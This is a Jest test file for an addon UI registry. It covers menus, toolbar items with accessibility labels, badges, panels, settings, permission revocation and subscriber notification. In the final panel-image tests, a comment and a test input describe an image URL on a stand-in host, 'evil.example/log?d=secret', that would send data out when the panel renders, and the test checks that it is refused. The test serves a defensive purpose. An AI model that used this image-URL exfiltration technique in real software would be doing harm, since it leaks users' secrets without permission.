/* Copyright (c) 2025-2026 Velimir Majstorov; SPDX-License-Identifier: GPL-3.0-or-later */

import {
  AddonUIRegistry,
  MAX_MENUS_PER_ADDON,
} from '../../src/services/scripting/AddonUIRegistry';

const manifest = {
  id: 'ui.addon',
  name: 'UI',
  author: 'Test',
  version: '1.0.0',
  description: 'Test',
  license: 'MIT',
  apiVersion: 1,
  minAppVersion: '1.10.0',
  entry: 'index.js',
  permissions: ['ui.extend'],
} as any;

const ADDON = 'ui.addon';

function harness(installed = true) {
  const requireGrant = jest.fn();
  const registry = new AddonUIRegistry(
    {
      initialize: jest.fn(async () => undefined),
      get: jest.fn(() => (installed ? { manifest } : undefined)),
    } as any,
    { initialize: jest.fn(async () => undefined), requireGrant } as any,
  );
  return { registry, requireGrant };
}

const menu = (id = 'my.menu', target = 'nick') => ({
  id,
  target,
  items: [{ id: 'act', label: 'Act' }],
});

describe('AddonUIRegistry', () => {
  describe('registration', () => {
    it('requires ui.extend', async () => {
      const h = harness();
      await h.registry.registerMenu(ADDON, menu());
      expect(h.requireGrant).toHaveBeenCalledWith(
        ADDON,
        manifest.permissions,
        'ui.extend',
      );
    });

    it('refuses an addon that is not installed', async () => {
      const h = harness(false);
      await expect(h.registry.registerMenu(ADDON, menu())).rejects.toThrow(
        /not installed/i,
      );
    });

    it('refuses an invalid contribution with the reason', async () => {
      const h = harness();
      await expect(
        h.registry.registerMenu(ADDON, { id: 'bad id', target: 'nick' }),
      ).rejects.toThrow(/invalid/i);
      await expect(
        h.registry.registerPanel(ADDON, 'p', 'Panel', [{ kind: 'webview' }]),
      ).rejects.toThrow(/not a known node/);
    });

    it('bounds how many menus one addon may contribute', async () => {
      const h = harness();
      for (let index = 0; index < MAX_MENUS_PER_ADDON; index += 1)
        await h.registry.registerMenu(ADDON, menu(`menu.${index}`));
      await expect(
        h.registry.registerMenu(ADDON, menu('menu.overflow')),
      ).rejects.toThrow(/limit/i);
    });

    it('lets an addon replace its own contribution without hitting the limit', async () => {
      const h = harness();
      for (let index = 0; index < MAX_MENUS_PER_ADDON; index += 1)
        await h.registry.registerMenu(ADDON, menu(`menu.${index}`));
      // Otherwise an addon could never refresh a menu it already owns.
      await expect(
        h.registry.registerMenu(ADDON, menu('menu.0')),
      ).resolves.toBeUndefined();
    });

    it('demands an accessibility label on a toolbar item', async () => {
      const h = harness();
      // A label like "×" tells a screen-reader user nothing, and quietly
      // reusing it would hide the problem.
      await expect(
        h.registry.registerToolbarItem(ADDON, {
          id: 'go',
          label: '×',
        } as any),
      ).rejects.toThrow(/accessibility/i);

      await h.registry.registerToolbarItem(ADDON, {
        id: 'go',
        label: '×',
        accessibilityLabel: 'Close the thing',
      });
      expect(h.registry.toolbarItems()).toHaveLength(1);
    });
  });

  describe('reading', () => {
    it('returns menus for the matching target only', async () => {
      const h = harness();
      await h.registry.registerMenu(ADDON, menu('a', 'nick'));
      await h.registry.registerMenu(ADDON, menu('b', 'channel'));

      expect(h.registry.menusFor('nick')).toHaveLength(1);
      expect(h.registry.menusFor('nick')[0].addonId).toBe(ADDON);
      expect(h.registry.menusFor('tab')).toHaveLength(0);
    });

    it('hides everything once the grant is revoked, without reinstalling', async () => {
      const h = harness();
      await h.registry.registerMenu(ADDON, menu());
      await h.registry.registerPanel(ADDON, 'p', 'Panel', [
        { kind: 'text', text: 'Hi' },
      ]);
      expect(h.registry.menusFor('nick')).toHaveLength(1);

      h.requireGrant.mockImplementation(() => {
        throw new Error('revoked');
      });

      // Re-checked on read, not only at registration: hiding the UI alone
      // would leave the registration live underneath.
      expect(h.registry.menusFor('nick')).toHaveLength(0);
      expect(h.registry.panels()).toHaveLength(0);
      expect(h.registry.settingsFor(ADDON)).toBeUndefined();
    });

    it('shows one badge per tab, the highest priority winning', async () => {
      const h = harness();
      await h.registry.registerBadge(ADDON, {
        id: 'low',
        tabId: 't1',
        text: '1',
        tone: 'info',
        priority: 1,
      });
      await h.registry.registerBadge(ADDON, {
        id: 'high',
        tabId: 't1',
        text: '9',
        tone: 'danger',
        priority: 5,
      });
      await h.registry.registerBadge(ADDON, {
        id: 'other',
        tabId: 't2',
        text: '2',
        tone: 'info',
        priority: 9,
      });

      expect(h.registry.badgeFor('t1')?.badge.id).toBe('high');
      expect(h.registry.badgeFor('t2')?.badge.id).toBe('other');
      expect(h.registry.badgeFor('t3')).toBeUndefined();
    });

    it('bounds badge text and priority', async () => {
      const h = harness();
      await h.registry.registerBadge(ADDON, {
        id: 'b',
        tabId: 't',
        text: 'a very long badge indeed',
        tone: 'info',
        priority: 500,
      });
      const badge = h.registry.badgeFor('t')!.badge;
      expect(badge.text).toHaveLength(8);
      expect(badge.priority).toBe(9);
    });

    it('stores a settings form and its fields', async () => {
      const h = harness();
      await h.registry.registerSettings(ADDON, 'Options', [
        { kind: 'toggle', id: 'on', label: 'Enabled' },
      ]);
      expect(h.registry.settingsFor(ADDON)?.title).toBe('Options');
      expect(h.registry.settingsFor(ADDON)?.fields).toHaveLength(1);
    });
  });

  describe('removal', () => {
    it('leaves no trace of an addon that was disabled', async () => {
      const h = harness();
      await h.registry.registerMenu(ADDON, menu());
      await h.registry.registerToolbarItem(ADDON, {
        id: 't',
        label: 'T',
        accessibilityLabel: 'T',
      });
      await h.registry.registerBadge(ADDON, {
        id: 'b',
        tabId: 't1',
        text: '1',
        tone: 'info',
        priority: 1,
      });
      await h.registry.registerPanel(ADDON, 'p', 'P', [
        { kind: 'text', text: 'x' },
      ]);

      h.registry.clear(ADDON);

      expect(h.registry.menusFor('nick')).toHaveLength(0);
      expect(h.registry.toolbarItems()).toHaveLength(0);
      expect(h.registry.badgeFor('t1')).toBeUndefined();
      expect(h.registry.panels()).toHaveLength(0);
    });

    it('removes one contribution by kind and id', async () => {
      const h = harness();
      await h.registry.registerMenu(ADDON, menu('a'));
      await h.registry.registerMenu(ADDON, menu('b'));
      h.registry.unregister(ADDON, 'menu', 'a');

      expect(h.registry.menusFor('nick').map(m => m.menu.id)).toEqual(['b']);
      // Unknown addon or id is a no-op rather than an error.
      h.registry.unregister('nobody', 'menu', 'b');
      h.registry.unregister(ADDON, 'menu', 'nope');
      expect(h.registry.menusFor('nick')).toHaveLength(1);
    });
  });

  describe('subscribers', () => {
    it('notifies on change and stops after unsubscribe', async () => {
      const h = harness();
      const listener = jest.fn();
      const unsubscribe = h.registry.subscribe(listener);

      await h.registry.registerMenu(ADDON, menu());
      expect(listener).toHaveBeenCalledTimes(1);

      h.registry.clear(ADDON);
      expect(listener).toHaveBeenCalledTimes(2);

      unsubscribe();
      await h.registry.registerMenu(ADDON, menu());
      expect(listener).toHaveBeenCalledTimes(2);
    });

    it('keeps telling the others when one subscriber throws', async () => {
      const h = harness();
      const good = jest.fn();
      h.registry.subscribe(() => {
        throw new Error('boom');
      });
      h.registry.subscribe(good);

      await h.registry.registerMenu(ADDON, menu());
      expect(good).toHaveBeenCalledTimes(1);
    });

    it('does not notify when clearing an addon that contributed nothing', () => {
      const h = harness();
      const listener = jest.fn();
      h.registry.subscribe(listener);
      h.registry.clear('nobody');
      expect(listener).not.toHaveBeenCalled();
    });
  });
});

describe('panel images are a network request (M3.1)', () => {
  const imagePanel = (url: string) => [
    { kind: 'image', url, alt: 'A picture' },
  ];

  it('refuses a host that is not on the allowed list', async () => {
    const h = harness();
    // `https://evil.example/log?d=<secrets>` fires a GET when the panel
    // renders: data out, with no `network` permission and without the
    // allowlist ever seeing it.
    await expect(
      h.registry.registerPanel(
        ADDON,
        'p',
        'Panel',
        imagePanel('https://evil.example/log?d=secret'),
      ),
    ).rejects.toThrow(/not on the allowed list/i);

    expect(h.registry.panels()).toHaveLength(0);
  });

  it('allows a host that is', async () => {
    const h = harness();
    await expect(
      h.registry.registerPanel(
        ADDON,
        'p',
        'Panel',
        imagePanel('https://github.com/logo.png'),
      ),
    ).resolves.toBeUndefined();

    expect(h.registry.panels()).toHaveLength(1);
  });

  it('still refuses http and private addresses before it gets that far', async () => {
    const h = harness();
    for (const url of [
      'http://github.com/logo.png',
      'https://192.168.1.1/logo.png',
      'https://localhost/logo.png',
    ])
      await expect(
        h.registry.registerPanel(ADDON, 'p', 'Panel', imagePanel(url)),
      ).rejects.toThrow();
  });

  it('leaves panels with no image alone', async () => {
    const h = harness();
    await expect(
      h.registry.registerPanel(ADDON, 'p', 'Panel', [
        { kind: 'text', text: 'Nothing fetched here' },
      ]),
    ).resolves.toBeUndefined();
  });
});
